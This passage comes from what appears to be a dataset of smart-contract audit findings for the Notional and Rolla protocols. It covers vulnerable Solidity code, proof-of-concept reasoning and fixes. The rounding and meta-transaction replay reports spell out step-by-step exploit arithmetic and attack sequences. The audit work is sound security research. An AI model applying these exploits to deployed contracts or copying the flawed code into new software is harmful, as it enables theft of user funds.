Consider implementing a `getPriorVotingPower` function which takes in a `blockNumber` argument and returns the correct balance at that specific block.







***"
81.md,`_validateOrder` Does Not Allow Anyone To Be A Taker Of An Off-Chain Order,medium,"The `EIP1271Wallet` contract intends to allow the treasury manager account to sign off-chain orders in 0x on behalf of the `TreasuryManager` contract, which holds harvested assets/`COMP` from Notional. While the `EIP1271Wallet._validateOrder` function mostly prevents the treasury manager from exploiting these orders, it does not ensure that the `takerAddress` and `senderAddress` are set to the zero address. As a result, it is possible for the manager to have sole rights to an off-chain order and due to the flexibility in `makerPrice`, the manager is able to extract value from the treasury by maximising the allowed slippage.

By setting `takerAddress` to the zero address, any user can be the taker of an off-chain order. By setting `senderAddress` to the zero address, anyone is allowed to access the exchange methods that interact with the order, including filling the order itself. Hence, these two order addresses can be manipulated by the manager to effectively restrict order trades to themselves.

#### Proof of Concept

<https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibOrder.sol#L66>
```solidity
address takerAddress;   // Address that is allowed to fill the order. If set to 0, any address is allowed to fill the order.
```

<https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250>

<https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L354-L374>

<https://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188>
```solidity
function _validateOrder(bytes memory order) private view {
    (
        address makerToken,
        address takerToken,
        address feeRecipient,
        uint256 makerAmount,
        uint256 takerAmount
    ) = _extractOrderInfo(order);

    // No fee recipient allowed
    require(feeRecipient == address(0), ""no fee recipient allowed"");

    // MakerToken should never be WETH
    require(makerToken != address(WETH), ""maker token must not be WETH"");

    // TakerToken (proceeds) should always be WETH
    require(takerToken == address(WETH), ""taker token must be WETH"");

    address priceOracle = priceOracles[makerToken];

    // Price oracle not defined
    require(priceOracle != address(0), ""price oracle not defined"");

    uint256 slippageLimit = slippageLimits[makerToken];

    // Slippage limit not defined
    require(slippageLimit != 0, ""slippage limit not defined"");

    uint256 oraclePrice = _toUint(
        AggregatorV2V3Interface(priceOracle).latestAnswer()
    );

    uint256 priceFloor = (oraclePrice * slippageLimit) /
        SLIPPAGE_LIMIT_PRECISION;

    uint256 makerDecimals = 10**ERC20(makerToken).decimals();

    // makerPrice = takerAmount / makerAmount
    uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;

    require(makerPrice >= priceFloor, ""slippage is too high"");
}
```

#### Tools Used

Manual code review.
Discussions with Notional team.

#### Recommended Mitigation Steps

Consider adding `require(takerAddress == address(0), ""manager cannot set taker"");` and `require(senderAddress == address(0), ""manager cannot set sender"");` statements to `_validateOrder`. This should allow any user to fill an order and prevent the manager from restricting exchange methods to themselves.







***"
98.md,Incorrect strike price displayed in name/symbol of qToken,high,"`_slice()` in `options/QTokenStringUtils.sol` cut a string into `string[start:end]` However, while fetching bytes, it uses `bytes(_s)[_start+1]` instead of `bytes(_s)[_start+i]`. This causes the return string to be composed of `_s[start]*(_end-_start)`. The result of this function is then used to represent the decimal part of strike price in name/symbol of qToken, leading to potential confusion over the actual value of options.

### Proof of Concept

ERC20 tokens are usually identified by their name and symbol. If the symbols are incorrect, confusions may occur. Some may argue that even if names and symbols are not accurate, it is still possible to identify correct information/usage of tokens by querying the provided view functions and looking at its interactions with other contracts. However, the truth is many users of those tokens are not very tech savvy, and it is reasonable to believe a large proportion of users are not equipped with enough knowledge, or not willing to dig further than the plain symbols and names. This highlights the importance of maintaining a correct facade for ERC20 tokens.

The bug demonstrated here shows that any qToken with decimals in its strike price will be misdisplayed, and the maximal difference between actual price and displayed one can be up to 0.1 BUSD.

The exploit can be outlined through the following steps:

*   Alice created a call option with strike price 10000.90001. The expected symbol should for this qToken should be : `ROLLA WETH 31-December-2022 10000.90001 Call`

*   Both `_qTokenName()` and `_qTokenSymbol()` in `options/QTokenStringUtils.sol` use `_displayedStrikePrice()` to get the strike price string which should be `10000.90001`

<https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L38><br>
<https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L90><br>

        function _qTokenName(
            address _quantConfig,
            address _underlyingAsset,
            address _strikeAsset,
            uint256 _strikePrice,
            uint256 _expiryTime,
            bool _isCall
        ) internal view virtual returns (string memory tokenName) {
            string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);
            string memory displayStrikePrice = _displayedStrikePrice(
                _strikePrice,
                _strikeAsset
            );
    		
            ...
    		
            tokenName = string(
                abi.encodePacked(
                    ""ROLLA"",
                    "" "",
                    underlying,
                    "" "",
                    _uintToChars(day),
                    ""-"",
                    monthFull,
                    ""-"",
                    Strings.toString(year),
                    "" "",
                    displayStrikePrice,
                    "" "",
                    typeFull
                )
            );
        }

```

    function _qTokenSymbol(
        address _quantConfig,
        address _underlyingAsset,
        address _strikeAsset,
        uint256 _strikePrice,
        uint256 _expiryTime,
        bool _isCall
    ) internal view virtual returns (string memory tokenSymbol) {
        string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);
        string memory displayStrikePrice = _displayedStrikePrice(
            _strikePrice,
            _strikeAsset
        );

        // convert the expiry to a readable string
        (uint256 year, uint256 month, uint256 day) = DateTime.timestampToDate(
            _expiryTime
        );

        // get option type string
        (string memory typeSymbol, ) = _getOptionType(_isCall);

        // get option month string
        (string memory monthSymbol, ) = _getMonth(month);

        /// concatenated symbol string
        tokenSymbol = string(
            abi.encodePacked(
                ""ROLLA"",
                ""-"",
                underlying,
                ""-"",
                _uintToChars(day),
                monthSymbol,
                _uintToChars(year),
                ""-"",
                displayStrikePrice,
                ""-"",
                typeSymbol
            )
        );
    }
```

*   `_displayedStrikePrice()` combines the quotient and the remainder to form the strike price string. The remainder use `_slice` to compute. In this case, the quotient is `10000` and the remainder is `90001`

<https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L136><br>

    function _displayedStrikePrice(uint256 _strikePrice, address _strikeAsset)
            internal
            view
            virtual
            returns (string memory)
        {
            uint256 strikePriceDigits = ERC20(_strikeAsset).decimals();
            uint256 strikePriceScale = 10**strikePriceDigits;
            uint256 remainder = _strikePrice % strikePriceScale;
            uint256 quotient = _strikePrice / strikePriceScale;
            string memory quotientStr = Strings.toString(quotient);

            if (remainder == 0) {
                return quotientStr;
            }

            uint256 trailingZeroes;
            while (remainder % 10 == 0) {
                remainder /= 10;
                trailingZeroes++;
            }

            // pad the number with ""1 + starting zeroes""
            remainder += 10**(strikePriceDigits - trailingZeroes);

            string memory tmp = Strings.toString(remainder);
            tmp = _slice(tmp, 1, (1 + strikePriceDigits) - trailingZeroes);

            return string(abi.encodePacked(quotientStr, ""."", tmp));
        }

*   However inside the loop of `_slice()`, `slice[i] = bytes(_s)[_start + 1];` lead to an incorrect string, which is `90001`

<https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L206><br>

        function _slice(
            string memory _s,
            uint256 _start,
            uint256 _end
        ) internal pure virtual returns (string memory) {
            uint256 range = _end - _start;
            bytes memory slice = new bytes(range);
            for (uint256 i = 0; i < range; ) {
                slice[i] = bytes(_s)[_start + 1];
                unchecked {
                    ++i;
                }
            }

            return string(slice);
        }

*   The final qtoken name now becomes `ROLLA WETH 31-December-2022 10000.99999 Call`, which results in confusion over the actual value of options.

### Recommended Mitigation Steps

Fix the bug in the `_slice()`

        function _slice(
            string memory _s,
            uint256 _start,
            uint256 _end
        ) internal pure virtual returns (string memory) {
            uint256 range = _end - _start;
            bytes memory slice = new bytes(range);
            for (uint256 i = 0; i < range; ) {
                slice[i] = bytes(_s)[_start + i];
                unchecked {
                    ++i;
                }
            }

            return string(slice);
        }



***"
98.md,Mint spread collateral-less and conjuring collateral claims out of thin air with implicit arithmetic rounding and flawed int to uint conversion,high,"[QuantMath.sol#L137](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/libraries/QuantMath.sol#L137)<br>
[QuantMath.sol#L151](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/libraries/QuantMath.sol#L151)<br>
[SignedConverter.sol#L28](https://github.com/code-423n4/2022-03-rolla/blob/main/quant-protocol/contracts/libraries/SignedConverter.sol#L28)<br>

This report presents 2 different incorrect behaviour that can affect the correctness of math calculations:

1.  Unattended Implicit rounding in QuantMath.sol `div` and `mul`
2.  Inappropriate method of casting integer to unsigned integer in SignedConverter.sol `intToUint`

Bug 1 affects the correctness when calculating collateral required for `_mintSpread`. Bug 2 expands the attack surface and allows attackers to target the `_claimCollateral` phase instead. Both attacks may result in tokens being stolen from Controller in the worst case, but is most likely too costly to exploit under current BNB chain environment. The potential impact however, should not be taken lightly, since it is known that the ethereum environment in highly volatile and minor changes in the environment can suddenly make those bugs cheap to exploit.

### Proof of Concept

In this section, we will first present bug 1, and then demonstrate how this bug can be exploited. Then we will discuss how bug 2 opens up more attack chances and go over another PoC.

Before getting started, we should go over an important concept while dealing with fixed point number -- rounding.
Math has no limits on precision, but computers do. This problem is especially critical to systems handling large amount of ""money"" that is allowed to be arbitrarily divided. A common way for ethereum smart contract developers to handle this is through rounding numbers. Rolla is no exception.

In QuantMath, Rolla explicitly wrote the `toScaledUint` function to differentiate between rounding numbers up or down when scaling numbers to different precision (or we call it `_decimals` here). The intended usage is to scale calculated numbers (amount of tokens) up when Controller is the receiver, and scale it down when Controller is sender. In theory, this function should guarantee Controller can never ""lose tokens"" due to rounding.

    library QuantMath {
        ...
        struct FixedPointInt {
            int256 value;
        }

        int256 private constant _SCALING_FACTOR = 1e27;
        uint256 private constant _BASE_DECIMALS = 27;

        ...

        function toScaledUint(
            FixedPointInt memory _a,
            uint256 _decimals,
            bool _roundDown
        ) internal pure returns (uint256) {
            uint256 scaledUint;

            if (_decimals == _BASE_DECIMALS) {
                scaledUint = _a.value.intToUint();
            } else if (_decimals > _BASE_DECIMALS) {
                uint256 exp = _decimals - _BASE_DECIMALS;
                scaledUint = (_a.value).intToUint() * 10**exp;
            } else {
                uint256 exp = _BASE_DECIMALS - _decimals;
                uint256 tailing;
                if (!_roundDown) {
                    uint256 remainer = (_a.value).intToUint() % 10**exp;
                    if (remainer > 0) tailing = 1;
                }
                scaledUint = (_a.value).intToUint() / 10**exp + tailing;
            }

            return scaledUint;
        }
        ...
    }

In practice, the above function also works quite well (sadly, not perfect, notice the `intToUint` function within. We will come back to this later), but it only works if we can promise that before entering this function, all numbers retain full precision and is not already rounded. This is where `div` and `mul` comes into play. As we can easily see in the snippet below, both functions involve the division operator '/', which by default discards the decimal part of the calculated result (be aware to not confuse this with the `_decimal` used while scaling FixedPointInt). The operation here results in an implicit round down, which limits the effectiveness of  explicit rounding in `toScaledUint` showned above.

        function mul(FixedPointInt memory a, FixedPointInt memory b)
            internal
            pure
            returns (FixedPointInt memory)
        {
            return FixedPointInt((a.value * b.value) / _SCALING_FACTOR);
        }


        function div(FixedPointInt memory a, FixedPointInt memory b)
            internal
            pure
            returns (FixedPointInt memory)
        {
            return FixedPointInt((a.value * _SCALING_FACTOR) / b.value);
        }

Now let's see how this implicit rounding can causes troubles. We start with the `_mintSpread` procedure creating a call credit spread. For brevity, the related code is not shown, but here's a summary of what is done.

*   `Controller._mintSpread`
    *   `QuantCalculator.getCollateralRequirement`
        *   `FundsCalculator.getCollateralRequirement`
            *   `FundsCalculator.getOptionCollateralRequirement`
                *   `FundsCalculator.getCallCollateralRequirement`
                    *   scales `_qTokenToMintStrikePrice` from
                        `_strikeAssetDecimals (8)` to `_BASE_DECIMALS (27)`
                    *   scales `_qTokenForCollateralStrikePrice` from
                        `_strikeAssetDecimals (8)` to `_BASE_DECIMALS (27)`
                    *   `collateralPerOption = (collateralStrikePrice.sub(mintStrikePrice)).div(collateralStrikePrice)`
                *   scale `_optionsAmount` from `_optionsDecimals (18)` to `_BASE_DECIMALS (27)`
                *   `collateralAmount = _optionsAmount.mul(collateralPerOption)`
            *   uses `qTokenToMint.underlyingAsset` (weth or wbtc) as collateral
        *   scale and round up `collateralAmountFP` from `_BASE_DECIMALS (27)` to `payoutDecimals (18)`

If we extract all the math related stuff, it would be something like below

    def callCreditSpreadCollateralRequirement(_qTokenToMintStrikePrice, _qTokenForCollateralStrikePrice, _optionsAmount):
            X1 = _qTokenToMintStrikePrice * 10^19
            X2 = _qTokenForCollateralStrikePrice * 10^19
            X3 = _optionsAmount * 10^9

            assert X1 < X2          #credit spread

            Y1 = (X2 - X1) * 10^27 // X2    #implicit round down due to div
            Y2 = Y1 * X3 // 10^27   #implicit round down due to mul

            Z = Y2 // 10^9
            if Y2 % 10^9 > 0:       #round up since we are minting spread (Controller is receiver)
                    Z+=1
            return Z

Both implicit round downs can be abused, but we shall focus on the `mul` one here.
Assume we follow the following actions

1.  create option `A` with strike price `10 + 10^-8 BUSD (10^9 + 1 under 8 decimals) <-> 1 WETH`<br>
2.  create option `B` with strike price `10 BUSD (10^9 under 8 decimals) <-> 1 WETH`<br>
3.  mint `10^-18` (1 under 18 decimals) option `A`<br>
    3-1. `pay 1 eth`<br>
4.  mint `10^-18` (1 under 18 decimals) spread `B` with `A` as collateral<br>
    4-1. `X1 = _qTokenToMintStrikePrice * 10^19 = 10^9 * 10^19 = 10^28`<br>
    4-2. `X2 = _qTokenToMintStrikePrice * 10^19 = (10^9 + 1) * 10^19 = 10^28 + 10^19`<br>
    4-3. `X3 = _optionsAmount * 10^9 = 1 * 10^9 = 10^9`<br>
    4-4. `Y1 = (X2 - X1) * 10^27 // X2 = (10^28 + 10^19 - 10^28) * 10^27 // (10^28 + 10^19) = 99999999000000000`<br>
    4-5. `Y2 = Y1 * X3 // 10^27 = 99999999000000000 * 10^9 / 10^27 = 0`<br>
    4-6. `Z = Y2 // 10^9 = 0`<br>
    4-7. `Y2 % 10^9 = 0` so `Z` remains unchanged<br>

We minted a call credit spread without paying any fee.

Now let's think about how to extract the value we conjured out of thin air. To be able to withdraw excessive collateral, we can choose to do a excercise+claim or neutralize current options. Here we take the neutralize path.

For neutralizing spreads, the procedure is basically the same as minting spreads, except that the explicit round down is taken since `Controller` is the payer here. The neutralize procedure returns the `qToken` used as collateral and pays the collateral fee back. The math part can be summarized as below.

    def neutralizeCreditSpreadCollateralRequirement(_qTokenToMintStrikePrice, _qTokenForCollateralStrikePrice, _optionsAmount):
            X1 = _qTokenToMintStrikePrice * 10^19
            X2 = _qTokenForCollateralStrikePrice * 10^19
            X3 = _optionsAmount * 10^9

            assert X1 < X2          #credit spread

            Y1 = (X2 - X1) * 10^27 // X2    #implicit round down due to div
            Y2 = Y1 * X3 // 10^27   #implicit round down due to mul

            Z = Y2 // 10^9  #explicit scaling
            return Z

There are two challenges that need to be bypassed, the first one is to avoid implicit round down in `mul`, and the second is to ensure the revenue is not rounded away during explicit scaling.
To achieve this, we first mint `10^-9 + 2 * 10^-18` spreads seperately (10^9 + 2 under 18 decimals), and as shown before, no additional fees are required while minting spread from original option.
Then we neutralize all those spreads at once, the calculation is shown below.

1.  neutralize `10^-9 + 2 * 10^-18` (10^9 + 2 under 18 decimals) spread `B`<br>
    4-1. `X1 = _qTokenToMintStrikePrice * 10^19 = 10^9 * 10^19 = 10^28`<br>
    4-2. `X2 = _qTokenToMintStrikePrice * 10^19 = (10^9 + 1) * 10^19 = 10^28 + 10^19`<br>
    4-3. `X3 = _optionsAmount * 10^9 = (10^9 + 2) * 10^9 = 10^18 + 2`<br>
    4-4. `Y1 = (X2 - X1) * 10^27 // X2 = (10^28 + 10^19 - 10^28) * 10^27 // (10^28 + 10^19) = 99999999000000000`<br>
    4-5. `Y2 = Y1 * X3 // 10^27 = 99999999000000000 * (10^18 + 2) / 10^27 = 1000000000`<br>
    4-6. `Z = Y2 // 10^9 = 10^9 // 10^9 = 1`<br>

And with this, we managed to generate 10^-18 weth of revenue.

This approach is pretty impractical due to the requirement of minting 10^-18 for `10^9 + 2` times. This montrous count mostly likely requires a lot of gas to pull off, and offsets the marginal revenue generated through our attack. This leads us to explore other possible methods to bypass this limitation.

It's time to start looking at the second bug.

Recall we mentioned the second bug is in `intToUint`, so here's the implementation of it. It is not hard to see that this is actually an `abs` function named as `intToUint`.

        function intToUint(int256 a) internal pure returns (uint256) {
            if (a < 0) {
                return uint256(-a);
            } else {
                return uint256(a);
            }
        }

Where is this function used? And yes, you guessed it, in `QuantCalculator.calculateClaimableCollateral`. The process of claiming collateral is quite complex, but we will only look at the specific case relevant to the exploit. Before reading code, let's first show the desired scenario. Note that while we wait for expiry, there are no need to sell any option/spread.

1.  mint a `qTokenLong` option
2.  mint a `qTokenShort` spread with `qTokenLong` as collateral
3.  wait until expire, and expect expiryPrice to be between qTokenLong and qTokenShort

<!---->

    ----------- qTokenLong strike price

    ----------- expiryPrice

    ----------- qTokenShort strike price

Here is the outline of the long waited claimCollateral for spread.

*   `Controller._claimCollateral`
    *   `QuantCalculator.calculateClaimableCollateral`
        *   `FundsCalculator.getSettlementPriceWithDecimals`
        *   `FundsCalculator.getPayout` for qTokenLong
            *   qTokenLong strike price is above expiry price, worth 0
        *   `FundsCalculator.getCollateralRequirement`
            *   This part we saw earlier, omit details
        *   `FundsCalculator.getPayout` for qTokenShort
            *   uses `qTokenToMint.underlyingAsset` (weth or wbtc) as collateral
            *   `FundsCalculator.getPayoutAmount` for qTokenShort
                *   scale `_strikePrice` from
                    `_strikeAssetDecimals (8)` to `_BASE_DECIMALS (27)`
                *   scale `_expiryPrice.price` from
                    `_expiryPrice.decimals (8)` to `_BASE_DECIMALS (27)`
                *   scale `_amount` from
                    `_optionsDecimals (18)` to `_BASE_DECIMALS (27)`
                *   `FundsCalculator.getPayoutForCall` for qTokenShort
                    *   `payoutAmount = expiryPrice.sub(strikePrice).mul(amount).div(expiryPrice)`
        *   `returnableCollateral = payoutFromLong.add(collateralRequirement).sub(payoutFromShort)`
        *   scale and round down `abs(returnableCollateral)` from `_BASE_DECIMALS (27)` to `payoutDecimals (18)`

Again, we summarize the math part into a function.

    def claimableCollateralCallCreditSpreadExpiryInbetween(_qTokenShortStrikePrice, _qTokenLongStrikePrice, _expiryPrice, _amount):

            def callCreditSpreadCollateralRequirement(_qTokenToMintStrikePrice, _qTokenForCollateralStrikePrice, _optionsAmount):
                    X1 = _qTokenToMintStrikePrice * 10^19
                    X2 = _qTokenForCollateralStrikePrice * 10^19
                    X3 = _optionsAmount * 10^9

                    Y1 = (X2 - X1) * 10^27 // X2
                    Y2 = Y1 * X3 // 10^27
                    return Y2

            def callCreditSpreadQTokenShortPayout(_strikePrice, _expiryPrice, _amount):
                    X1 = _strikePrice * 10^19
                    X2 = _expiryPrice * 10^19
                    X3 = _amount * 10^9

                    Y1 = (X2-X1) * X3 // 10^27
                    Y2 = Y1 * 10^27 // X2
                    return Y2


            assert _qTokenShortStrikePrice > _expiryPrice > _qTokenLongStrikePrice

            A1 = payoutFromLong = 0
            A2 = collateralRequirement = callCreditSpreadCollateralRequirement(_qTokenShortStrikePrice, _qTokenLongStrikePrice, _amount)
            A3 = payoutFromShort = callCreditSpreadQTokenShortPayout(_qTokenShortStrikePrice, _expiryPrice, _amount)

            B1 = A1 + A2 - A3

            Z = abs(B1) // 10^9
            return Z

Given the context, it should be pretty easy to imagine what I am aiming here, to make `B1 < 0`. We already know `A1 = 0`, so the gaol basically boils down to making `A2 < A3`. Let's further simplify this requirement and see if the equation is solvable.

    X = _qTokenLongStrikePrice (8 decimals)
    Y = _expiryPrice (8 decimals)
    Z = _qTokenShortStrikePrice (8 decimals)
    A = _amount (scaled to 27 decimals)

    assert X>Y>Z>0
    assert X,Y,Z are integers
    assert (((X - Z) * 10^27 // X) * A // 10^27) < (((Y - Z) * A // 10^27) * 10^27 // Y)

Notice apart from the use of `X` and `Y`, the two sides of the equation only differs by when `A` is mixed into the equation, meaning that if we temporarily ignore the limitation and set `X = Y`, as long as left hand side of equation does an implicit rounding after dividing by X, right hand side will most likely be larger.

Utilizing this, we turn to solve the equation of:

    (X-Z) / X - (Y-Z) / Y < 10^-27
    => Z / Y - Z / X < 10^-27
    => (Z = 1 yields best solution)
    => 1 / Y - 1 / X < 10^-27
    => X - Y < X * Y * 10^-27
    => 0 < X * Y - 10^27 * X + 10^27 * Y

    => require X > Y, so model Y as X - B, where B > 0 and B is an integer
    => 0 < X^2 - B * X - 10^27 * B

It is not easy to see that the larger `X` is, the larger the range of allowed `B`. This is pretty important since `B` stands for the range of expiry prices where attack could work, so the larger it is, the less accurate our guess can be to profit.

Apart form range of `B`, value of `X` is the long strike price and upper bound of range `B`, so we would also care about it, a simple estimation shows that `X` must be above `10^13.5 (8 decimals)` for there to be a solution, which amounts to about `316228 BUSD <-> 1 WETH`. This is an extremely high price, but not high enough to be concluded as unreachable in the near future. So let's take a slightly generous number of `10^14 - 1` as X and calculate the revenue generated following this exploit path.

    0 < (10^14 - 1)^2 - B * (10^14 - 1) - 10^27 * B
    => (10^14 - 1)^2 / (10^14 - 1 + 10^27) > B
    => B <= 9

Now we've got the range of profitable expiry price. As we concluded earlier, the range is extremely small with a modest long strike price, but let's settle with this for now and see how much profit can be generated if we get lucky. To calculate profit, we take `_qTokenLongStrikePrice = 10^14 - 1 (8 decimals)`, `_qTokenShortStrikePrice = 1 (8 decimals)`, `_expiryPrice = 10^14 - 2 (8 decimals)` and `_amount = 10^28 (18 decimals)` and plug it back into the function.

1.  in `callCreditSpreadCollateralRequirement`<br>
    1-1. `X1 = _qTokenForCollateralStrikePrice * 10^19 = 1 * 10^19 = 10^19`<br>
    1-2. `X2 = _qTokenToMintStrikePrice * 10^19 = (10^14 - 1) * 10^19 = 10^33 - 10^19`<br>
    1-3. `X3 = _optionsAmount * 10^9 = 10^28 * 10^9 = 10^37`<br>
    1-4. `Y1 = (X2 - X1) * 10^27 // X2 = (10^33 - 2 * 10^19) * 10^27 // (10^33 - 10^19) = 999999999999989999999999999`<br>
    1-5. `Y2 = Y1 * X3 // 10^27 = 999999999999989999999999999 * 10^37 // 10^27 = 999999999999989999999999999 * 10^10`<br>
2.  in `callCreditSpreadQTokenShortPayout`<br>
    2-1. `X1 = _strikePrice * 10^19 = 1 * 10^19 = 10^19`<br>
    2-2. `X2 = _expiryPrice * 10^19 = (10^14 - 2) * 10^19 = 10^33 - 2 * 10^19`<br>
    2-3. `X3 = _amount * 10^9 = 10^28 * 10^9 = 10^37`<br>
    2-4. `Y1 = (X2 - X1) * X3 // 10^27 = (10^33 - 3 * 10^19) * 10^37 // 10^27 = 99999999999997 * 10^29`<br>
    2-5. \`Y2 = Y1 \* 10^27 / X2 = (99999999999997 \* 10^28) \* 10^27 / (10^33 - 2 \* 10^19) = 9999999999999899999999999997999999999<br>
3.  combine terms<br>
    3-1. ` B1 = A1 + A2 - A3 = 0 + 9999999999999899999999999990000000000 - 9999999999999899999999999997999999999 = -2000000001<br>
         3-2.  `Z = abs(B1) // 10^9 = 2000000000 // 10^9 = 2<br>

And with this, we managed to squeeze 2 wei from a presumably worthless collateral.

This attack still suffers from several problems

1.  cost of WETH in BUSD is way higher than current market
2.  need to predict target price accurately to profit
3.  requires large amount of WETH to profit

While it is still pretty hard to pull off attack, the requirements seems pretty more likely to be achievable compared to the first version of exploit. Apart from this, there is also the nice property that this attack allows profit to scale with money invested.

This concludes our demonstration of two attacks against the potential flaws in number handling.

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

For `div` and `mul`, adding in a similar opt-out round up argument would work. This would require some refactoring of code, but is the only way to fundamentally solve the problem.

For `intToUint`, I still can't understand what the original motive is to design it as `abs` in disguise. Since nowhere in this project would we benefit from the current `abs` behaviour, in my opinion, it would be best to adopt a similar strategy to the `uintToInt` function. If the value goes out of directly convertable range ( < 0), revert and throw an error message.




***"
98.md,Wrong implementation of `EIP712MetaTransaction`,high,"1.  `EIP712MetaTransaction` is a utils contract that intended to be inherited by concrete (actual) contracts, therefore. it's initializer function should not use the `initializer` modifier, instead, it should use `onlyInitializing` modifier. See the implementation of [openzeppelin `EIP712Upgradeable` initializer function](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.1/contracts/utils/cryptography/draft-EIP712Upgradeable.sol#L48-L57).

[EIP712MetaTransaction.sol#L102-L114](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/utils/EIP712MetaTransaction.sol#L102-L114)<br>

```solidity
    /// @notice initialize method for EIP712Upgradeable
    /// @dev called once after initial deployment and every upgrade.
    /// @param _name the user readable name of the signing domain for EIP712
    /// @param _version the current major version of the signing domain for EIP712
    function initializeEIP712(string memory _name, string memory _version)
        public
        initializer
    {
        name = _name;
        version = _version;

        __EIP712_init(_name, _version);
    }
```

Otherwise, when the concrete contract's initializer function (with a `initializer` modifier) is calling EIP712MetaTransaction's initializer function, it will be mistok as reentered and so that it will be reverted (unless in the context of a constructor, e.g. Using @openzeppelin/hardhat-upgrades `deployProxy()` to initialize).

<https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.1/contracts/proxy/utils/Initializable.sol#L50-L53>

```solidity
    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        // If the contract is initializing we ignore whether _initialized is set in order to support multiple
        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the
        // contract may have been reentered.
        require(_initializing ? _isConstructor() : !_initialized, ""Initializable: contract is already initialized"");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }
```

See also: <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/releases/tag/v4.4.1>

2.  `initializer` can only be called once, it can not be ""called once after every upgrade"".

[EIP712MetaTransaction.sol#L102-L114](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/utils/EIP712MetaTransaction.sol#L102-L114)<br>

```solidity
    /// @notice initialize method for EIP712Upgradeable
    /// @dev called once after initial deployment and every upgrade.
    /// @param _name the user readable name of the signing domain for EIP712
    /// @param _version the current major version of the signing domain for EIP712
    function initializeEIP712(string memory _name, string memory _version)
        public
        initializer
    {
        name = _name;
        version = _version;

        __EIP712_init(_name, _version);
    }
```

3.  A utils contract that is not expected to be deployed as a standalone contract should be declared as `abstract`. It's `initializer` function should be `internal`.

See the implementation of [openzeppelin `EIP712Upgradeable`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.1/contracts/utils/cryptography/draft-EIP712Upgradeable.sol#L28).

<https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v4.5.1/contracts/utils/cryptography/draft-EIP712Upgradeable.sol#L28>

```solidity
abstract contract EIP712Upgradeable is Initializable {
    // ...
}
```

### Recommended Mitigation Steps

Change to:

```solidity
abstract contract EIP712MetaTransaction is EIP712Upgradeable {
    // ...
}
```

```solidity
    /// @notice initialize method for EIP712Upgradeable
    /// @dev called once after initial deployment.
    /// @param _name the user readable name of the signing domain for EIP712
    /// @param _version the current major version of the signing domain for EIP712
    function __EIP712MetaTransaction_init(string memory _name, string memory _version)
        internal
        onlyInitializing
    {
        name = _name;
        version = _version;

        __EIP712_init(_name, _version);
    }
```




***"
98.md,`EIP712MetaTransaction.executeMetaTransaction()` failed txs are open to replay attacks,high,"Any transactions that fail based on some conditions that may change in the future are not safe to be executed again later (e.g. transactions that are based on others actions, or time-dependent etc).

In the current implementation, once the low-level call is failed, the whole tx will be reverted and so that `_nonces[metaAction.from]` will remain unchanged.

As a result, the same tx can be replayed by anyone, using the same signature.

[EIP712MetaTransaction.sol#L86](https://github.com/code-423n4/2022-03-rolla/blob/efe4a3c1af8d77c5dfb5ba110c3507e67a061bdd/quant-protocol/contracts/utils/EIP712MetaTransaction.sol#L86)<br>

```solidity
    function executeMetaTransaction(
        MetaAction memory metaAction,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external payable returns (bytes memory) {
        require(
            _verify(metaAction.from, metaAction, r, s, v),
            ""signer and signature don't match""
        );

        uint256 currentNonce = _nonces[metaAction.from];

        // intentionally allow this to overflow to save gas,
        // and it's impossible for someone to do 2 ^ 256 - 1 meta txs
        unchecked {
            _nonces[metaAction.from] = currentNonce + 1;
        }

        // Append the metaAction.from at the end so that it can be extracted later
        // from the calling context (see _msgSender() below)
        (bool success, bytes memory returnData) = address(this).call(
            abi.encodePacked(
                abi.encodeWithSelector(
                    IController(address(this)).operate.selector,
                    metaAction.actions
                ),
                metaAction.from
            )
        );

        require(success, ""unsuccessful function call"");
        emit MetaTransactionExecuted(
            metaAction.from,
            payable(msg.sender),
            currentNonce
        );
        return returnData;
    }
```

See also the implementation of OpenZeppelin's `MinimalForwarder`:

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/metatx/MinimalForwarder.sol#L42-L66>

### Proof of Concept

Given:

*   The collateral is USDC;
*   Alice got `10,000 USDC` in the wallet.

1.  Alice submitted a MetaTransaction to `operate()` and `_mintOptionsPosition()` with `10,000 USDC`;
2.  Before the MetaTransaction get executed, Alice sent `1,000 USDC` to Bob;
3.  The MetaTransaction submited by Alice in step 1 get executed but failed;
4.  A few days later, Bob sent `1,000 USDC` to Alice;
5.  The attacker can replay the MetaTransaction failed to execute at step 3 and succeed.

Alice's `10,000 USDC` is now been spent unexpectedly against her will and can potentially cause fund loss depends on the market situation.

### Recommended Mitigation Steps

